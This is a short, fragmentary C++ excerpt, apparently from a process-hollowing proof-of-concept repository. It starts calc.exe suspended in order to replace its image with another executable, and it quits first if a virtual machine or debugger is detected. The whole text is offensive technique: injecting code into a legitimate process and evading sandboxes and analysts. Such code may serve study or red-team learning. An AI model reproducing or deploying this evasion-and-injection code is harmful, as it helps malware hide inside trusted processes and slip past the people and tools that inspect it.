...
int process_hollowing(LPSTR path_dest) {
	// create destination process - this is the process to be hollowed out
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	CreateProcessA(NULL, (LPSTR)path_dest, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	...
	HANDLE sourceFile = CreateFileA("C:\\Users\\ducto\\Source\\Repos\\Process-Hollowing\\sourcecode\\Release\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
...
int main()
{
	VM_detect t1;
	Debugger_detect t2;
	if (t1.Check_VM() || t2.Check_Debugger())
	{
		ExitProcess(0);
	}
	else {
		LPSTR filePath = (LPSTR)"c:\\Windows\\SysWOW64\\calc.exe";
		process_hollowing(filePath);
